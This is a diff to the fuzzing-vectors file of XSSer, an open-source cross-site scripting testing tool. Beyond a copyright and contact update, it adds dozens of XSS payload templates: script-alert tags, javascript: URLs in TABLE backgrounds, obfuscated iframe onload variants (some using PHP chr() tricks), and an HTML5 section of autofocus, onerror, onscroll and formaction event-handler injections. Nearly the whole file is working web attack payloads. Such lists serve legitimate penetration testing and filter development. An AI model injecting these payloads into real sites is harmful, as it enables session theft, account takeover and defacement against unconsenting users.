@@ -3,7 +3,7 @@ $Id$
 
 This file is part of the xsser project, http://xsser.sourceforge.net.
 
-Copyright (c) 2010 psy <root@lordepsylon.net>
+Copyright (c) 2011/2012 psy <root@lordepsylon.net> - <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -22,13 +22,15 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 ## XXSer.py @@ fuzzing vectors @@ psy
 #
 ## This file contains different XSS fuzzing vectors to inject in payloads and browser supports.
-## If you have some new vectors, please email me to [root@lordepsylon.net-epsylon@riseup.net] and i will try to add your list to XSSer framework.
+## If you have some new vectors, please email me to [root@lordepsylon.net - epsylon@riseup.net] and will be added to XSSer framework.
 ## Thats all.
 ###
 ## Happy Cross Hacking! ;)
 
 vectors = [	{ 'payload':"""">PAYLOAD""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+                { 'payload':""""><SCRIPT>alert('PAYLOAD')</SCRIPT>""",
+                  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 		{ 'payload':"""'';!--"<PAYLOAD>=&{()}" """,
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},	
                 { 'payload':"""</TITLE>PAYLOAD""",
@@ -83,6 +85,8 @@ vectors = [	{ 'payload':"""">PAYLOAD""",
 	   	  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 	 	{ 'payload':"""<TABLE BACKGROUND="PAYLOAD">""",
 	          'browser':"""[IE6.0|NS8.1-IE] [O9.02]"""},
+                { 'payload':"""<TABLE BACKGROUND=javascript:PAYLOAD>""",
+                  'browser':"""[O9.02]"""},
 		{ 'payload':"""<TABLE><TD BACKGROUND="PAYLOAD">""",
 		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 		{ 'payload':"""<DIV STYLE="background-image: url(PAYLOAD);">""",
@@ -93,6 +97,20 @@ vectors = [	{ 'payload':"""">PAYLOAD""",
 		  'browser':"""[IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},			  
 		{ 'payload':"""<IFRAME SRC="PAYLOAD"></IFRAME>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+                { 'payload':"""<iframe/ /onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe/ "onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe///////onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe "onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe/ "onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe<?php echo chr(11)?> onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
+                { 'payload':"""<iframe<?php echo chr(12)?> onload=PAYLOAD></iframe>""",
+                  'browser':"""Not Info"""},
    		{ 'payload':"""<FRAMESET><FRAME SRC="PAYLOAD"></FRAMESET>""",
 		  'browser':"""[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
 		{ 'payload':"""<TABLE BACKGROUND="PAYLOAD">""",
@@ -159,9 +177,9 @@ vectors = [	{ 'payload':"""">PAYLOAD""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
 		{ 'payload':"""<OBJECT classid=clsid:..." codebase="javascript:PAYLOAD">""",
 		  'browser':"""[O9.02]"""},
-		{ 'payload':"""<style><!--</style><script>PAYLOAD//--></script>""",
+		{ 'payload':"""<style><!--</style><SCRIPT>PAYLOAD//--></SCRIPT>""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
-		{ 'payload':"""![CDATA[<!--]]<script>PAYLOAD//--></script>""",
+		{ 'payload':"""![CDATA[<!--]]<SCRIPT>PAYLOAD//--></SCRIPT>""",
 		  'browser':"""[IE6.0|NS8.1-IE]"""},
 		{ 'payload':"""<!-- -- -->PAYLOAD<!-- -- -->""",
 		  'browser':"""[Not Info]"""},
@@ -172,5 +190,31 @@ vectors = [	{ 'payload':"""">PAYLOAD""",
 	#	{ 'payload':"""[\xC0][\xBC]script>PAYLOAD[\xC0][\xBC]/script>""",
 	#	  'browser':"""[Not Info]"""},	
 		{ 'payload':"""<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:PAYLOAD">]]</C><X></xml>""",
-		  'browser':"""[IE6.0|NS8.1-IE]"""}
+		  'browser':"""[IE6.0|NS8.1-IE]"""},
+        #HTML5
+                { 'payload':"""<form id="test" /><button form="test" formaction="javascript:PAYLOAD">X""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<input onfocus=javascript:PAYLOAD autofocus>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<select onfocus=javascript:PAYLOAD autofocus>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<textarea onfocus=javascript:PAYLOAD autofocus>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<keygen onfocus=javascript:PAYLOAD autofocus>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<input onblur=javascript:PAYLOAD autofocus><input autofocus>
+""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<video poster=javascript:PAYLOAD//""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<body onscroll=PAYLOAD><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""X<form id=test onforminput=javascript:PAYLOAD><input></form>""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""X<form id=test><input></form><button form=test onformchange==javascript:PAYLOAD>X""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<video><source onerror="javascript:PAYLOAD">""",
+                  'browser':"""[HTML5 Injection]"""},
+                { 'payload':"""<video onerror="javascript:PAYLOAD"><source>""",
+                  'browser':"""[HTML5 Injection]"""}
 ]
